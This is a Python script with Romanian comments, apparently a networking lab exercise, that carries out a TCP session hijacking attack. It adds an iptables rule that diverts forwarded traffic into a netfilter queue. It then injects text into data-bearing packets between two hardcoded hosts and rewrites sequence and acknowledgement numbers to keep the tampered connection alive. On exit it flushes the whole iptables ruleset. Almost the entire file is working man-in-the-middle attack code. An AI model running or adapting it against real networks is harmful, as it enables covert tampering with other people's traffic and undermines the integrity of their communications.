"""
https://0xbharath.github.io/art-of-packet-crafting-with-scapy/scapy/creating_packets/index.html#creating-a-packet
https://www.site24x7.com/learn/linux/tcp-flags.html
https://medium.com/@R00tendo/tcp-connection-hijacking-deep-dive-9bbe03fce9a9
https://scapy.readthedocs.io/en/latest/build_dissect.html#layers
"""

from scapy.all import *
from scapy.all import IP, UDP, DNS, TCP
from netfilterqueue import NetfilterQueue as NFQ
import os

class Metadata:
    # IP of router
    client_ip = "198.7.0.1"
    server_ip = "198.7.0.2"
    PSH = 0x08

text_to_add = "BRRRRR "
seq_persistence = {}
ack_persistence = {}

def detect_and_alter_packet(packet):
    global text_to_add, seq_persistence, ack_persistence

    octects = packet.get_payload()
    scapy_packet = IP(octects)

    # daca pachetul are layer de IP si TCP 
    if scapy_packet.haslayer(IP) and scapy_packet.haslayer(TCP) and (scapy_packet[IP].src == Metadata.client_ip or scapy_packet[IP].src == Metadata.server_ip):
        if scapy_packet[TCP].seq in seq_persistence:
            new_seq = seq_persistence[scapy_packet[TCP].seq]
        else:
            new_seq = scapy_packet[TCP].seq 

        if scapy_packet[TCP].ack in ack_persistence:
            new_ack = ack_persistence[scapy_packet[TCP].ack]
        else:
            new_ack = scapy_packet[TCP].ack 

        scapy_packet = alter_packet(scapy_packet, new_seq=new_seq, new_ack=new_ack)

    send(scapy_packet)

    # asta nu merge pentru ca noi schimbam pachetul
    # trebuie sa construi unul nou
    # packet.accept()

def alter_packet(packet, new_seq, new_ack):
    global seq_persistence, ack_persistence, text_to_add

    print("[BEFORE]:", packet.summary())

    # daca pachetul nostru a are flag-ul PSH
    # inseamna ca pachetul e in statusul de trimitere
    # deci ar trebui modificat mesajul la ceva nou (hacking)
    if packet[TCP].flags & Metadata.PSH:
        mesaj = scapy.packet.Raw(bytes(text_to_add.encode('utf-8')) + bytes(packet[TCP].payload))
    else:
        mesaj = packet[TCP].payload

    # contruim pachetul IP cu IP sursa si destinatie corespunzatoare
    new_IP_packet = IP(src = packet[IP].src, dst = packet[IP].dst)
    # construim pachetul TCP cu porturile sursa/destinatie, 
    # valorile noi pentru SEQ si ACK si flag-urile originale 
    new_TCP_packet = TCP(
        sport = packet[TCP].sport,
        dport = packet[TCP].dport,
        seq = new_seq,
        ack = new_ack,
        flags = packet[TCP].flags
    )

    # chain link pachetul IP cu cel TCP si in final payload-ul mesaj
    new_packet = new_IP_packet / new_TCP_packet / (mesaj)

    print("[AFTER]:", new_packet.summary())

    seq_persistence[packet[TCP].seq + len(packet[TCP].payload)] = new_seq + len(mesaj)
    ack_persistence[new_seq + len(mesaj)] = packet[TCP].seq + len(packet[TCP].payload)

    #returnam pachetul modificat
    return new_packet


print("INCEPEM TCP HIJACKING...")
queue = NFQ()
try:
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 10")
    # bind trebuie să folosească aceiași coadă ca cea definită în iptables
    queue.bind(10, detect_and_alter_packet)
    queue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
    queue.unbind()
    print("AM OPRIT TCP HIJACKING")
